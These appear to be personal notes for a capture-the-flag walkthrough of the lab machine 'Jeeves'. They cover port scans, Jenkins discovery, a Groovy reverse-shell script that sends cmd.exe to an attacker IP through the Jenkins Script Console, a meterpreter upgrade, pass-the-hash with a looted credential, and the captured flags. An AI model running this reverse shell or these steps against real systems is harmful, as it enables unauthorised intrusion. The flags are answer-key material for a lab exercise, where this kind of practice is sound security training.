# Recon
- Windows
- Powershell
- Web

# Scans
## Nmap Port scan
```
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008 (89%)
```

# Enumeration
## 80 - IIS 10.0
### Dirbuster
```
200       17l       40w      503c http://10.10.10.63/Index.html
200        1l        4w       50c http://10.10.10.63/error.html
200       17l       40w      503c http://10.10.10.63/index.html
```
### Comments
```
Comment: 
|         
|         
|         
|                 box-shadow: 0 0 2px rgba(0,0,0,.8) inset;*/
|     
|     Path: http://10.10.10.63:80/style.css
|     Line number: 12
|     Comment: 
|_        /*-------------------------------------*/

```
![[bdebdd190ba5429cb56fb0c226f0fcab.png]]


## 135 - msRPC
There are some remote procedures available to call.

## 50000 - Jetty 9.4 z
### Dirbuster
```
302        0l        0w        0c http://10.10.10.63:50000/askjeeves
```
### Whatweb
```
Summary   : PoweredBy[Jetty://], HTTPServer[Jetty(9.4.z-SNAPSHOT)], Jetty[9.4.z-SNAPSHOT]
```
It's **Jenkins**!
![[777336350d994a32b4a34a4060cecbf7.png]]
**Found some OS info**
![[ad3d4b1ed1f44875956b74b1dbdc7e6c.png]]
![[6256831207ec43fa8db3ef1d144305a1.png]]

# Weaponization
## Jetty 9.4
### Possible directory traversal
![[d180e3f8f6f54d218d9a9baa4fda1fc3.png]]
`http://10.10.10.63:80/askjeeves/.\..\..\..\..\..\..\..\Documents and Settings\All Users\Application Data\VMware\VMware VirtualCenter\SSL\rui.key`
## MS SQL Server 2005
```
MS SQL Server 2000/2005 - SQLNS.SQLNamespace COM Object Refresh() Unhandled Pointer 
|	windows/remote/38005.asp
```

## Jenkins 2.87
Script Editor


# Exploitation
Start a **netcat listener**
![[b1750106a13f4d05a86538c794116aac.png]]
Used **Jenkins Script Console** to get RCE using this **malicious Groovy Script**
```
String host="10.10.16.4";
int port=6969;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## I am kohsuke now
![[b257d9b4e73d4a9a85932b3f0f007a5f.png]]

## User Flag `e3232272596fb47950d59c4cf1e7066a`
![[7496fc58605c4b11b0b5d3a18af61a65.png]]

# Enumeration as User
![[58da6b71679949878a4d82b5989027e8.png]]
# PrivEsc
## Switch to a meterpreter
### Use `multi/script/web_delivery` to get a meterpreter.
![[ce41a2818fb24d73a6e60ecb56e6bb08.png]]
Got meterpreter
![[4e4e1c69e1ba4608a24b42ac1ffbff20.png]]

There is a **KeyPass** (how ironic) database in the users documents folder.

![[2166d9a925da44f383e640828a24b619.png]]

This one looks pretty interesting
![[6375aa4d9c704604b36a2271dabb26c8.png]]
`administrator`
`S1TjAtJHKsugh9oC4VZl`
Turns out this one is an NTLM hash, which can be passed with **pth-winexe**
![[81fa6d1c1f2e46abaac3a2152b264e4b.png]]

## Got Administrator by passing the hash
![[f12b3d657e5c4b538f727182da628447.png]]
Not done yet...
![[60318885e10a49c38f3e69fd0de58912.png]]
`dir /r` to see **more**
![[19fd34556ce9456d9fe8bbad3e6a9af7.png]]
**powershell** to dump the flag.
![[5f9196f490964b61a1273db1fe11dcda.png]]

root: `afbc5bd4b615a60648cec41c6ac92530`